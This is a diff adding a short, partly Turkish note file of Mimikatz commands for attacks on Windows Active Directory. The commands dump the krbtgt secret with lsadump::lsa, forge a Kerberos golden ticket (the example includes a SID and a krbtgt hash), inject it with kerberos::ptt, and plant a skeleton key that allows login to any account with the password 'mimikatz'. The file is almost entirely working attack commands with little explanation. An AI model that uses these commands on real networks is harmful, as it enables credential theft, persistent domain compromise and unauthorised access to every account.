@@ -1,0 +1,14 @@
+1)lsadump::lsa /inject /name:krbtgt extracts all the information needed to create a golden ticket
+
+2)Kerberos::golden /user:kullanıcı /domain:domain.asdfa /sid: /krbtgt: /id:  == örn: Invoke-Mimikatz -Command '"Kerberos::golden /user:AdminimBne /domain:kedthesec.local /sid:S-1-5-21-2129465151-2710223712-1163647420-500 /krbtgt:3c3d78cf9e1063c03ec2e8fbe553cb62 /id:500"'
+
+3) Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
+
+3) misc::cmd and switch to our new ticket
+
+
+<<<<<<<<<<<<<<Skeleton Key Attack>>>>>>>>>>>>>>>>>
+
+Note: This attack allows us to log into any account we want using "mimikatz" as the password.
+
+misc::skeleton
